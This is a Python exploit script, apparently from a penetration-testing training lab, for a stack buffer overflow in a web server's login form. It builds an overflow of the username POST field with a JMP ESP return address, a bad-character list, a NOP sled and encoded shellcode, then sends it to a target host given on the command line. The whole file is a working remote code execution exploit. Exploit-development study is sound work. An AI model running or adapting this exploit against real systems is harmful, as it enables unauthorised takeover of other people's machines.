#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A"*780
  eip = b"\x83\x0c\x09\x10" # JMP ESP 
  offset = b"C"*4  #don't know the point of this...
  badchars = (
  	b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14"
	b"\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x27\x28"
	b"\x29\x2a\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
	b"\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64"
	b"\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
	b"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
	b"\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
	b"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8"
	b"\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
	b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  
  # list of badchars:  
  #	\0x00 = null byte
  #	\0x0A = line feed
  #	\0x0D = the return character
  #	\0x25 = "%"
  #	\0x26 = "&" 
  #	\0x2b = "+"   
  #	\0x3d = "=" 
  
  shellcode = (
	b"\xbd\xb1\x99\x12\x84\xdd\xc3\xd9\x74\x24\xf4\x5e\x29\xc9"
	b"\xb1\x52\x83\xee\xfc\x31\x6e\x0e\x03\xdf\x97\xf0\x71\xe3"
	b"\x40\x76\x79\x1b\x91\x17\xf3\xfe\xa0\x17\x67\x8b\x93\xa7"
	b"\xe3\xd9\x1f\x43\xa1\xc9\x94\x21\x6e\xfe\x1d\x8f\x48\x31"
	b"\x9d\xbc\xa9\x50\x1d\xbf\xfd\xb2\x1c\x70\xf0\xb3\x59\x6d"
	b"\xf9\xe1\x32\xf9\xac\x15\x36\xb7\x6c\x9e\x04\x59\xf5\x43"
	b"\xdc\x58\xd4\xd2\x56\x03\xf6\xd5\xbb\x3f\xbf\xcd\xd8\x7a"
	b"\x09\x66\x2a\xf0\x88\xae\x62\xf9\x27\x8f\x4a\x08\x39\xc8"
	b"\x6d\xf3\x4c\x20\x8e\x8e\x56\xf7\xec\x54\xd2\xe3\x57\x1e"
	b"\x44\xcf\x66\xf3\x13\x84\x65\xb8\x50\xc2\x69\x3f\xb4\x79"
	b"\x95\xb4\x3b\xad\x1f\x8e\x1f\x69\x7b\x54\x01\x28\x21\x3b"
	b"\x3e\x2a\x8a\xe4\x9a\x21\x27\xf0\x96\x68\x20\x35\x9b\x92"
	b"\xb0\x51\xac\xe1\x82\xfe\x06\x6d\xaf\x77\x81\x6a\xd0\xad"
	b"\x75\xe4\x2f\x4e\x86\x2d\xf4\x1a\xd6\x45\xdd\x22\xbd\x95"
	b"\xe2\xf6\x12\xc5\x4c\xa9\xd2\xb5\x2c\x19\xbb\xdf\xa2\x46"
	b"\xdb\xe0\x68\xef\x76\x1b\xfb\xd0\x2f\x0e\x08\xb8\x2d\x50"
	b"\xef\x82\xbb\xb6\x85\xe4\xed\x61\x32\x9c\xb7\xf9\xa3\x61"
	b"\x62\x84\xe4\xea\x81\x79\xaa\x1a\xef\x69\x5b\xeb\xba\xd3"
	b"\xca\xf4\x10\x7b\x90\x67\xff\x7b\xdf\x9b\xa8\x2c\x88\x6a"
	b"\xa1\xb8\x24\xd4\x1b\xde\xb4\x80\x64\x5a\x63\x71\x6a\x63"
	b"\xe6\xcd\x48\x73\x3e\xcd\xd4\x27\xee\x98\x82\x91\x48\x73"
	b"\x65\x4b\x03\x28\x2f\x1b\xd2\x02\xf0\x5d\xdb\x4e\x86\x81"
	b"\x6a\x27\xdf\xbe\x43\xaf\xd7\xc7\xb9\x4f\x17\x12\x7a\x6f"
	b"\xfa\xb6\x77\x18\xa3\x53\x3a\x45\x54\x8e\x79\x70\xd7\x3a"
	b"\x02\x87\xc7\x4f\x07\xc3\x4f\xbc\x75\x5c\x3a\xc2\x2a\x5d"
	b"\x6f")
  	
  	
  nops = b"\x90"*10	

  #shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  
  inputBuffer = filler + eip + offset + nops + shellcode
  #inputBuffer = filler + eip + offset + shellcode
  
  
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")

